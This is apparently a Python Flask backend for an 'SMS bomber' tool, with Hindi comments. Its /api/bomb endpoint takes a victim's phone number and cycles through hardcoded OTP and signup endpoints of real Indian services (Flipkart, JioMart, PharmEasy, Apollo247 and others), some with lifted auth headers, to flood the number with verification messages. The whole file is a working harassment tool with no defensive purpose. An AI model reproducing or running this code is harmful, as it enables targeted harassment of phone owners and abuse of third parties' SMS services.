from flask import Flask, request, jsonify, send_from_directory
import requests
from bs4 import BeautifulSoup
import json
import os

# हम बता रहे हैं कि index.html बाहर (root) में है
app = Flask(__name__, static_folder='../')

@app.route('/')
def index():
    # यह होमपेज (index.html) को लोड करेगा
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/<path:path>')
def static_files(path):
    # यह style.css और script.js को लोड करेगा
    return send_from_directory(app.static_folder, path)

@app.route('/api/bomb')
def bomb():
    target = request.args.get('number')
    idx = int(request.args.get('index', 0))
    
    apis = [
        {"name": "Flipkart_v6", "method": "POST", "url": "https://1.rome.api.flipkart.com/api/6/user/signup/status", "json": {"loginId": [f"+91{target}"], "supportAllStates": True}},
        {"name": "JioMart", "method": "POST", "url": "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp", "json": {"mobile": target}},
        {"name": "PharmEasy", "method": "POST", "url": "https://pharmeasy.in/api/auth/requestOTP", "json": {"contactNumber": target}},
        {"name": "Tata_1mg", "method": "POST", "url": "https://www.1mg.com/pwa-api/auth/create_token", "json": {"number": target, "is_doctor": False, "referral_code": None}},
        {"name": "Netmeds", "method": "POST", "url": "https://www.netmeds.com/api/service/application/user/authentication/v1.0/login/otp?platform=65f562c1504a59a67f529ad4", "json": {"mobile": target, "country_code": "91"}},
        {"name": "PlatinumRx", "method": "POST", "url": "https://backend.platinumrx.in/auth/sendOtp", "json": {"phone_number": target}},
        {"name": "Apollo247", "method": "POST", "url": "https://apigateway.apollo247.in/auth-service/generateOtp", "json": {"loginType": "PATIENT", "mobileNumber": f"+91{target}"}, "headers": {"X-Apollo-Pre-Auth-Key": "eyJHbGciOiJIUzI1NiJ9.ZTVhM2I0YmEtY2E0NC00M2I0LTg0ZTUtZDU3M2M1YjRjZTU3.XyJ9", "platform": "web"}},
        {"name": "Mamaearth", "method": "POST", "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send", "json": {"phone": target, "country": "in", "country_code": "+91"}, "headers": {"Gk-Merchant-Id": "12wyqc26spoknx0kv7t"}}
    ]

    api = apis[idx % len(apis)]
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    if "headers" in api: headers.update(api["headers"])

    try:
        if api["method"] == "POST":
            res = requests.post(api["url"], json=api["json"], headers=headers, timeout=5)
            if res.status_code in [200, 201, 202]:
                return jsonify({"status": "success", "name": api["name"]})
    except: pass
    return jsonify({"status": "failed", "name": api["name"]})
